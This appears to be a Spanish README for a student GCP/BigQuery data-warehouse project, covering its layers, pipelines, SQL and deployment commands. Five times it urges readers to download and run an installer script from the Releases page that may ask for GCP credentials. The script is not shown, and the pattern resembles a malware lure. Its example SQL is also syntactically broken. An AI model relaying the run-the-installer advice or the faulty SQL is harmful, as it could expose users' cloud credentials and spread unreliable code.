TP-Infra | Infraestructura Data Science en GCP y BigQuery

[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github)](https://github.com/uploaduncle/tp-infra/releases)

<img alt="GCP, BigQuery, GCS" src="https://raw.githubusercontent.com/google/cloud-assets/main/gcp-icons/cloud.png" width="120" />

Descripción
---------
Este repositorio contiene todos los archivos del trabajo práctico final de la materia "Infraestructura para la Ciencia de Datos" de la Licenciatura en Ciencia de Datos (UNSAM). Aquí encontrarás el diseño del datawarehouse, los scripts ETL, los pipelines en Python y los SQL para cargar y transformar datos en Google Cloud Platform (GCP) usando BigQuery y Google Cloud Storage (GCS).

Badges y topics
---------------
[![bigquery](https://img.shields.io/badge/BigQuery-✔-orange?logo=googlebigquery)](#) [![gcs](https://img.shields.io/badge/GCS-✔-blue?logo=googlecloud)](#) [![etl](https://img.shields.io/badge/ETL-✔-informational?logo=apacheairflow)](#)  
[![python](https://img.shields.io/badge/Python-✔-blue?logo=python)](#) [![sql](https://img.shields.io/badge/SQL-✔-brightgreen?logo=mysql)](#)

Temas: bigquery, buckets, datamart, datawarehouse, etl, gcp, gcs, pipelines, python, sql

Vista rápida
------------
- Arquitectura: GCS -> Pub/Sub (opcional) -> Dataflow/Cloud Run -> BigQuery (raw, staging, datamart)
- Lenguajes y herramientas: Python, SQL, gcloud, BigQuery, Cloud Storage, Airflow/Cloud Composer (opcional)
- Incluye: scripts de ingestión, transformaciones SQL, modelos de datamart, diagramas y guías de despliegue
- Releases: Descargue y ejecute el instalador desde la sección de Releases: https://github.com/uploaduncle/tp-infra/releases

Contenido del repositorio
------------------------
- infra/ — Plantillas de Terraform y scripts de gcloud para provisionar recursos en GCP
- pipelines/ — Pipelines en Python para ingestion y transformación
- sql/ — Scripts SQL para tablas raw, staging y datamart
- docs/ — Diagramas, especificaciones de esquema y manual del proyecto
- samples/ — Datos de ejemplo y notebooks
- scripts/ — Utilidades y el instalador (por ejemplo: tp-infra-installer.sh)

Arquitectura y diagrama
-----------------------
![Arquitectura](https://miro.medium.com/max/1400/1*9R0Gk6qYcK2gkF8n5dZfAw.png)

Descripción breve de capas:
- Raw: datos sin procesar en GCS y BigQuery. Conserva la fuente original.
- Staging: datos normalizados y con tipos corregidos. Aquí ocurre la mayor parte de la limpieza.
- Datamart: tablas de negocio listas para análisis y reportes. Contienen métricas y dimensiones.

Quickstart (instalación local / cloud)
-------------------------------------
1. Clona el repositorio
   - git clone https://github.com/uploaduncle/tp-infra.git
2. Visita Releases y descarga el instalador
   - Descargue el archivo tp-infra-installer.sh desde https://github.com/uploaduncle/tp-infra/releases y ejecútelo.
   - El instalador prepara el entorno, instala dependencias y crea recursos mínimos locales para pruebas.
3. Ejecuta el instalador (ejemplo)
   - chmod +x tp-infra-installer.sh
   - ./tp-infra-installer.sh --preview
   - El script puede pedir credenciales de GCP y permisos para crear buckets y datasets.

Nota sobre Releases
-------------------
La sección Releases contiene el instalador y los paquetes preempaquetados. Descargue el archivo tp-infra-installer.sh desde https://github.com/uploaduncle/tp-infra/releases y ejecútelo para preparar el entorno y desplegar los pipelines de ejemplo. El instalador incluye comprobaciones de entorno y comandos gcloud para crear: buckets GCS, datasets BigQuery y servicios de ejecución.

Guía de despliegue en GCP
-------------------------
Requisitos previos:
- Cuenta Google Cloud con proyecto activo
- gcloud CLI configurado
- Permisos: Storage Admin, BigQuery Admin, Service Account Admin

Pasos:
1. Configure gcloud
   - gcloud auth login
   - gcloud config set project <PROJECT_ID>
2. Cree un bucket para raw
   - gsutil mb -p <PROJECT_ID> gs://tp-infra-raw-<PROJECT_ID>/
3. Cree el dataset en BigQuery
   - bq --location=US mk -d --description "TP Infra dataset" <PROJECT_ID>:tp_infra
4. Ejecute el instalador desde Releases o use los scripts de infra/
   - ./scripts/deploy_gcp.sh --project <PROJECT_ID>
5. Desencadene un pipeline de ejemplo
   - python pipelines/load_sample.py --bucket gs://tp-infra-raw-<PROJECT_ID> --dataset tp_infra

Estructura de datos y modelos
----------------------------
- raw.events: tabla en BigQuery que contiene los eventos tal cual llegan.
- staging.users: tabla con usuarios normalizados.
- datamart.sales_summary: tabla agregada por día con métricas clave.

Ejemplo de SQL para transformar raw -> staging
- INSERT INTO tp_infra.staging_users AS
  SELECT
    CAST(user_id AS STRING) AS user_id,
    LOWER(TRIM(email)) AS email,
    TIMESTAMP_SECONDS(event_time) AS created_at
  FROM tp_infra.raw_events
  WHERE event_type = 'signup';

Pipelines (arquitectura y prácticas)
-----------------------------------
- Pipelines idempotentes. Cada job puede ejecutarse varias veces sin efectos colaterales.
- Registro de estados en BigQuery: jobs_log.table
- Manejo de errores: reintentos controlados y dead-letter bucket en GCS

Ejemplo: pipeline de ingestión en Python (resumen)
- Lee archivos desde GCS
- Valida esquema usando pandas/schema
- Normaliza campos
- Inserta en tabla raw de BigQuery
- Mueve archivo procesado a gs://processed/

Comandos de ejemplo
-------------------
- Ingesta local:
  - python pipelines/ingest.py --source samples/events.csv --project <PROJECT_ID> --dataset tp_infra
- Ejecutar transformaciones:
  - bq query --use_legacy_sql=false --format=prettyjson < sql/staging_transform.sql
- Crear dataset:
  - bq mk --dataset <PROJECT_ID>:tp_infra

Buenas prácticas incluidas
--------------------------
- Separé capas raw/staging/datamart para mantener trazabilidad.
- Versioné esquemas en sql/schemas/ con prefijo de versión.
- Añadí tests unitarios para transformaciones clave en tests/.
- Configuré CI (opcional) para validar SQL y Python antes del merge.

Testing y calidad
-----------------
- tests/unit: pruebas de funciones de transformación con pytest
- tests/integration: pruebas que ejecutan pipelines sobre datos de muestra
- Para ejecutar:
  - pip install -r requirements-dev.txt
  - pytest -q

CI/CD
-----
- Se incluyen plantillas de GitHub Actions en .github/workflows para:
  - Lint de Python
  - Ejecutar tests unitarios
  - Validar SQL syntax con SQLFluff (opcional)
- Para despliegue automático configure secretos de GCP en GitHub Secrets.

Contribuir
----------
- Cree una issue para proponer cambios o reportar bugs.
- Abra un Pull Request con una descripción clara y referencia a la issue.
- Añada tests para cualquier nueva transformación o script.
- Mantenga el estilo de código y documente nuevos endpoints o tablas.

Recursos y enlaces útiles
-------------------------
- Documentación BigQuery: https://cloud.google.com/bigquery/docs
- Cloud Storage: https://cloud.google.com/storage/docs
- gcloud CLI: https://cloud.google.com/sdk/docs
- Releases del proyecto: https://github.com/uploaduncle/tp-infra/releases

Licencia
--------
Este repositorio usa la licencia MIT. Consulte el archivo LICENSE para más detalles.

Contacto
-------
- Equipo: Alumno/a y profesor/a de la materia.
- Issues: Use el sistema de Issues del repositorio para reportes y preguntas.

Assets y recursos visuales
--------------------------
- Iconos GCP y BigQuery en los diagramas
- Notebooks para exploración rápida en samples/notebooks/
- Ejemplo de dashboard en Looker Studio (configuración en docs/dashboard/)

Notas finales
-------------
- Visite la sección Releases para descargar el instalador y los paquetes preconstruidos: https://github.com/uploaduncle/tp-infra/releases  
- Descargue el archivo tp-infra-installer.sh desde esa página y ejecútelo para desplegar los componentes básicos y cargar datos de ejemplo.